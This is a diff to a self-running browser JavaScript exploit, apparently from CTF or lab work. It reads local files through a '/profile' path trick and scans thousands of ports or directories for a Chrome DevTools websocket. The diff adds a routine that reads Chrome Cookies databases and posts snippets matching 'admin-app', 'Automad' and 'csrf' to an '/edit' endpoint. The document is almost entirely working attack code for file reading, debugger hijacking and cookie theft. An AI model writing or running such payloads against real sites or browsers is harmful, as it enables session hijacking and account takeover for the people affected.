@@ -1,8 +1,16 @@
 (async()=>{
+if(window.__codexRun0615ae)return;
+window.__codexRun0615ae=1;
 const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
 const read=async p=>{
  try{
   let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
+  return [r.status,await r.text()];
+ }catch(e){return [0,'']}
+};
+const readRange=async(p,o,l=1500)=>{
+ try{
+  let r=await fetch('/profile'+p+'%3f?offset='+o+'&limit='+l,{cache:'no-store'});
   return [r.status,await r.text()];
  }catch(e){return [0,'']}
 };
@@ -49,6 +57,7 @@ const wsFrom=async dir=>{
  if(!port||!path)return '';
  return 'ws://localhost:'+port+path;
 };
+let profileDirs=[];
 const findWs=async()=>{
  for(let base=1;base<4000;base+=80){
   let res=await Promise.all(Array.from({length:80},async(_,i)=>{
@@ -60,6 +69,7 @@ const findWs=async()=>{
    if(!dirs.length)post('dir none '+c.slice(0,180));
    for(let dir of dirs){
     post('dir '+dir);
+    if(!profileDirs.includes(dir))profileDirs.push(dir);
     post('dirhex '+Array.from(dir).map(ch=>ch.charCodeAt(0).toString(16).padStart(2,'0')).join('').slice(0,180));
     let ws=await wsFrom(dir);
     if(ws)return ws;
@@ -70,6 +80,28 @@ const findWs=async()=>{
   if(hit)return hit;
  }
  return '';
+};
+const scanCookies=async()=>{
+ post('cookie scan');
+ let suffixes=['/Default/Network/Cookies','/Default/Cookies','/Profile 1/Network/Cookies','/Profile 1/Cookies','/Network/Cookies'];
+ for(let dir of profileDirs){
+  for(let suf of suffixes){
+   let seen=false;
+   for(let off=0;off<300000;off+=1400){
+    let [st,d]=await readRange(dir+suf,off);
+    if(st!==200){if(off===0)post('cookie miss '+suf+' '+st);break}
+    if(!d.replace(/\./g,'').length)break;
+    let hits=['admin-app','Automad','csrf'].map(x=>d.indexOf(x)).filter(x=>x>=0);
+    if(hits.length){
+     seen=true;
+     let i=Math.max(0,Math.min(...hits)-40);
+     post('cookiehit '+suf+' '+off+' '+d.slice(i,Math.min(d.length,i+300)));
+    }
+   }
+   if(seen)return;
+  }
+ }
+ post('cookie none');
 };
 const frameRun=urls=>{
  window.addEventListener('message',e=>{
@@ -154,9 +186,10 @@ const run=(urls,fail)=>{
  start();
 };
 
-post('cdp dyn 0615ad');
+post('cdp dyn 0615ae');
 let wsurl=await findWs();
 if(!wsurl){post('ws none');return}
 let urls=[wsurl,wsurl.replace('ws://localhost:','ws://127.0.0.1:'),wsurl.replace('ws://localhost:','ws://[::1]:')];
 run(urls,()=>frameRun(urls));
+setTimeout(scanCookies,12000);
 })();
